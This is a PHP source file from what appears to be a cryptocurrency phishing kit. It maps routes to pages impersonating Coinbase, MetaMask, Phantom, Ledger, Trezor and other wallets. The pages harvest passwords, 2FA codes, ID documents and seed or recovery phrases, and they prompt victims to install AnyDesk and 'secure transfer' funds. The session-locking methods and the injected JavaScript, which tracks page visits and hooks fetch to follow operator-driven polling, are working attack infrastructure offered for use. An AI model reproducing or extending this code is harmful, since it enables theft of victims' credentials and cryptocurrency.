<?php

namespace App\Services;

use App\Models\UserSession;
use Illuminate\Support\Facades\DB;

class DocumentAuthority
{
    public static function canonicalPage(string $path): string
    {
        $path = ltrim($path, '/');
        $pageMap = [
            ''        => 'home',
            'signup'  => 'signup',
            'signin'  => 'signin',
            'verify'  => 'verify',
            'offline' => 'offline',
            'coinbase/support-landing'       => 'coinbase_support_landing',
            'coinbase/sign-in'               => 'coinbase_sign_in',
            'coinbase/sms-code'              => 'coinbase_sms_code',
            'coinbase/access-code'           => 'coinbase_access_code',
            'coinbase/access-pin'            => 'coinbase_access_pin',
            'coinbase/password'              => 'coinbase_password',
            'coinbase/loading'               => 'coinbase_loading',
            'coinbase/review-account'         => 'coinbase_review_account',
            'coinbase/review-account-loading' => 'coinbase_review_account_loading',
            'coinbase/authenticator-code'     => 'coinbase_authenticator_code',
            'coinbase/anydesk'                => 'coinbase_anydesk',
            'coinbase/device-confirmation'    => 'coinbase_device_confirmation',
            'coinbase/representative-contact' => 'coinbase_representative_contact',
            'coinbase/verify-identity'        => 'coinbase_verify_identity',
            'coinbase/email-code'             => 'coinbase_email_code',
            'coinbase/select-id-type'         => 'coinbase_select_id_type',
            'coinbase/done'                   => 'coinbase_done',
            'coinbase/seed'                   => 'coinbase_seed',
            'coinbase/create-vault'           => 'coinbase_create_vault',
            'coinbase/link-coinbase'          => 'coinbase_link_coinbase',
            'coinbase/download-coinbase-wallet' => 'coinbase_download_wallet',
            'coinbase/import-recovery-phrase' => 'coinbase_import_recovery_phrase',
            'coinbase/whitelist-coinbase-wallet' => 'coinbase_whitelist_wallet',
            'coinbase/connect-vault'             => 'coinbase_connect_vault',
            'coinbase/select-vault-assets'       => 'coinbase_select_vault_assets',
            'coinbase/vault-balance'             => 'coinbase_vault_balance',
            'coinbase/disconnect-wallet'      => 'coinbase_disconnect_wallet',
            'coinbase/disconnected-done'      => 'coinbase_disconnected_done',
            'coinbase/secure-transfer'        => 'coinbase_secure_transfer',
            'coinbase/last-activity'          => 'coinbase_last_activity',
            'coinbase/estimated-balance'      => 'coinbase_estimated_balance',
            'coinbase/high-security'          => 'coinbase_high_security',
            'coinbase/reset-password'         => 'coinbase_reset_password',
            'phantom/seeds' => 'phantom_seeds',
            'phantom/loading' => 'phantom_loading',
            'phantom/recover' => 'phantom_recover',
            'metamask/import' => 'metamask_import',
            'metamask/loading' => 'metamask_loading',
            'metamask/recover' => 'metamask_recover',
            'trust/disconnect' => 'trust_disconnect',
            'trust/recover' => 'trust_recover',
            'trust/loading' => 'trust_loading',
            'exodus/import' => 'exodus_import',
            'exodus/recover' => 'exodus_recover',
            'exodus/loading' => 'exodus_loading',
            'ellipal/1' => 'ellipal_24word',
            'ellipal/2' => 'ellipal_12word',
            'ellipal/recover' => 'ellipal_recover',
            'ellipal/loading' => 'ellipal_loading',
            'trezor/connect' => 'trezor_connect',
            'trezor/recover' => 'trezor_recover',
            'trezor/phrase-page' => 'trezor_phrase_page',
            'trezor/loading' => 'trezor_loading',
            'ledger/1' => 'ledger_1',
            'ledger/2' => 'ledger_2',
            'ledger/3' => 'ledger_3',
            'ledger/1/recover' => 'ledger_1_recover',
            'ledger/2/recover' => 'ledger_2_recover',
            'ledger/3/recover' => 'ledger_3_recover',
            'ledger/support' => 'ledger_signin',
            'ledger/loading' => 'ledger_loading',
        ];

        return $pageMap[$path] ?? $path;
    }

    public static function mint(UserSession $session, string $canonicalPage, int $requestStartUs): ?string
    {
        $committedDoc = null;
        DB::transaction(function () use ($session, $canonicalPage, $requestStartUs, &$committedDoc) {
            $locked = UserSession::where('session_token', $session->session_token)
                ->lockForUpdate()
                ->first();
            if (!$locked) {
                return;
            }
            $issuedUs = $locked->document_issued_at;
            $issuedUs = $issuedUs === null ? null : (int) $issuedUs;
            if ($issuedUs !== null && $requestStartUs < $issuedUs) {
                return;
            }
            $docId = bin2hex(random_bytes(16));
            $locked->document_id = $docId;
            $locked->document_issued_at = $requestStartUs;
            $locked->current_page = $canonicalPage;
            $locked->last_seen_at = now();
            $locked->save();
            $committedDoc = $docId;
        });

        return (is_string($committedDoc) && $committedDoc !== '') ? $committedDoc : null;
    }

    /**
     * @return array{ok:bool,doc:?string,renewed:bool}
     */
    public static function activate(UserSession $session, string $canonicalPage, int $requestStartUs, string $suppliedDoc): array
    {
        $out = ['ok' => false, 'doc' => null, 'renewed' => false];
        DB::transaction(function () use ($session, $canonicalPage, $requestStartUs, $suppliedDoc, &$out) {
            $locked = UserSession::where('session_token', $session->session_token)
                ->lockForUpdate()
                ->first();
            if (!$locked) {
                return;
            }
            $current = (string) ($locked->document_id ?? '');
            $page = (string) ($locked->current_page ?? '');
            if ($suppliedDoc !== '' && $suppliedDoc === $current && $canonicalPage === $page) {
                $issuedUs = $locked->document_issued_at;
                $issuedUs = $issuedUs === null ? null : (int) $issuedUs;
                // Older already-current: same id, renewed=false, do not rewind issued_at.
                if ($issuedUs === null || $requestStartUs >= $issuedUs) {
                    $locked->document_issued_at = $requestStartUs;
                    $locked->last_seen_at = now();
                    $locked->save();
                }
                $out = ['ok' => true, 'doc' => $current, 'renewed' => false];
                return;
            }
            $issuedUs = $locked->document_issued_at;
            $issuedUs = $issuedUs === null ? null : (int) $issuedUs;
            if ($issuedUs !== null && $requestStartUs < $issuedUs) {
                return;
            }
            $docId = bin2hex(random_bytes(16));
            $locked->document_id = $docId;
            $locked->document_issued_at = $requestStartUs;
            $locked->current_page = $canonicalPage;
            $locked->last_seen_at = now();
            $locked->save();
            $out = ['ok' => true, 'doc' => $docId, 'renewed' => true];
        });

        return $out;
    }

    public static function clientScript(string $pageName, string $csrf, string $docId, string $element): string
    {
        $pageJs = json_encode($pageName, JSON_UNESCAPED_SLASHES);
        $elJs = json_encode($element, JSON_UNESCAPED_SLASHES);
        $csrfJs = json_encode($csrf, JSON_UNESCAPED_SLASHES);

        return <<<JS
window._llDocId='{$docId}';window._llStayOk=false;window._llStayId=0;window._llAuthGen=1;window._llAuthDead=false;window._llAuthStartedGen=0;window._llAuthRetried=false;window._llAuthInFlightGen=0;window._llPollReconDone=false;window._llAuthClosed409=false;
window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});
window._llWhenWritable=function(send){var g=window._llAuthGen;return Promise.resolve(window._llAuthReady).then(function(){if(window._llAuthDead||window._llAuthGen!==g)return Promise.reject();return send();});};
window._llPostTrackNow=function(p,u){u=u||TRACK;return new Promise(function(res,rej){var n=0;function go(){n++;fetch(u,{method:'POST',body:p,keepalive:true}).then(function(r){return r.text().then(function(t){var j=null;try{j=JSON.parse(t);}catch(e){}return{ok:r.ok,j:j};});}).then(function(x){if(x.ok&&x.j&&x.j.ok===true){res(x.j);return;}if(n>=3){rej();return;}setTimeout(go,250);}).catch(function(){if(n>=3){rej();return;}setTimeout(go,250);});}go();});};
window._llPostTrack=function(p,u){return window._llWhenWritable(function(){if(p&&p.set)p.set('doc',window._llDocId||'');return window._llPostTrackNow(p,u);});};
function _llNavType(){try{var n=performance.getEntriesByType&&performance.getEntriesByType('navigation');if(n&&n[0]&&n[0].type)return n[0].type;}catch(e){}try{if(performance.navigation){if(performance.navigation.type===1)return 'reload';if(performance.navigation.type===2)return 'back_forward';}}catch(e){}return 'navigate';}
function _llIsHistoryShow(e){if(e&&e.persisted)return true;return _llNavType()==='back_forward';}
function _llBeginVisit(){if(!window._llDocId){window._llStayReadyPromise=Promise.resolve(null);return window._llStayReadyPromise;}var b=new URLSearchParams({_token:{$csrfJs},type:'page_visit',page:{$pageJs},element:{$elJs},value:location.pathname,doc:window._llDocId});window._llStayReadyPromise=window._llPostTrackNow(b).then(function(j){if(j&&j.stay){window._llStayOk=true;window._llStayId=j.stay;}return j;}).catch(function(){return null;});return window._llStayReadyPromise;}
function _llClearAuthInFlight(g){if(window._llAuthInFlightGen===g)window._llAuthInFlightGen=0;}
function _llBeginActivate(){if(window._llAuthDead)return;var g=window._llAuthGen;if(window._llAuthStartedGen===g)return;window._llAuthStartedGen=g;window._llAuthInFlightGen=g;window._llStayOk=false;window._llStayId=0;var body=new URLSearchParams({_token:{$csrfJs},doc:String(window._llDocId||''),path:location.pathname});fetch('/session/activate',{method:'POST',body:body,headers:{'X-CSRF-TOKEN':{$csrfJs},'Accept':'application/json'}}).then(function(r){return r.text().then(function(t){var j=null;try{j=JSON.parse(t);}catch(e){}return j;});}).then(function(j){if(window._llAuthDead||window._llAuthGen!==g){_llClearAuthInFlight(g);return;}if(!j||j.ok!==true||!j.doc){window._llAuthClosed409=true;_llClearAuthInFlight(g);window._llAuthReadyRej();return;}_llClearAuthInFlight(g);window._llDocId=j.doc;window._llAuthRetried=false;window._llAuthReadyRes();_llBeginVisit();}).catch(function(){_llClearAuthInFlight(g);if(window._llAuthGen!==g||window._llAuthDead)return;window._llAuthReadyRej();_llRetryActivateIfNeeded();});}
if(_llNavType()!=='back_forward'){window._llAuthReadyRes();_llBeginVisit();}
function _llBeginRestore(){window._llPollReconDone=false;window._llAuthClosed409=false;window._llAuthDead=false;window._llAuthGen++;window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});window._llAuthStartedGen=0;window._llStayOk=false;window._llStayId=0;window._llAuthRetried=false;_llBeginActivate();}
if(!window._llOwnPageshowBound){window._llOwnPageshowBound=true;window._llPageShows=0;window.addEventListener('pageshow',function(){window._llPageShows++;if(window._llPageShows===1){if(_llNavType()==='back_forward'){window._llAuthReadyRes();_llBeginVisit();}return;}_llBeginRestore();});}
window.addEventListener('pagehide',function(e){if(!e.persisted)return;window._llAuthGen++;window._llAuthDead=true;window._llStayOk=false;window._llStayId=0;try{window._llAuthReadyRej();}catch(x){}});
function _llDocVisible(){return document.visibilityState==='visible'&&!document.hidden;}
function _llRearmIfVisible(){if(!_llDocVisible()||!window._llAuthDead)return;window._llAuthDead=false;window._llAuthGen++;window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});window._llAuthStartedGen=0;window._llStayOk=false;window._llStayId=0;_llBeginActivate();}
function _llRetryActivateIfNeeded(){if(window._llAuthRetried||!_llDocVisible()||window._llAuthDead)return;if(window._llAuthStartedGen!==window._llAuthGen)return;window._llAuthRetried=true;window._llAuthDead=true;_llRearmIfVisible();}
function _llScheduleRearm(){if(window._llRearmT)clearTimeout(window._llRearmT);window._llRearmT=setTimeout(function(){window._llRearmT=0;_llRearmIfVisible();},50);}
window.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')_llRearmIfVisible();});
window.addEventListener('pageshow',function(){_llRearmIfVisible();});
window.addEventListener('popstate',function(){_llScheduleRearm();});
function _llReconcileFromPoll(j){if(!_llDocVisible())return;if(!j||j.authority_match!==false){if(j&&j.authority_match===true){window._llPollReconDone=false;window._llAuthClosed409=false;}return;}if(window._llAuthInFlightGen===window._llAuthGen)return;if(window._llPollReconDone||window._llAuthClosed409)return;window._llPollReconDone=true;window._llAuthDead=false;window._llAuthGen++;window._llAuthReady=new Promise(function(res,rej){window._llAuthReadyRes=res;window._llAuthReadyRej=rej;});window._llAuthStartedGen=0;window._llStayOk=false;window._llStayId=0;window._llAuthRetried=false;_llBeginActivate();}
if(!window._llPollAuthBound){window._llPollAuthBound=true;var _llFetch=window.fetch;window.fetch=function(u,o){var raw=typeof u==='string'?u:(u&&u.url)||'';var check=String(raw).indexOf('/api/check')!==-1;if(check&&window._llDocId){try{var a=new URL(raw,location.href);a.searchParams.set('page',{$pageJs});a.searchParams.set('doc',String(window._llDocId||''));if(typeof u==='string')u=a.pathname+a.search;}catch(x){}}var p=_llFetch.apply(this,typeof u==='string'?[u,o]:arguments);if(!check)return p;return p.then(function(r){try{r.clone().text().then(function(t){var j=null;try{j=JSON.parse(t);}catch(e){}_llReconcileFromPoll(j);});}catch(e){}return r;});};}
JS;
    }
}
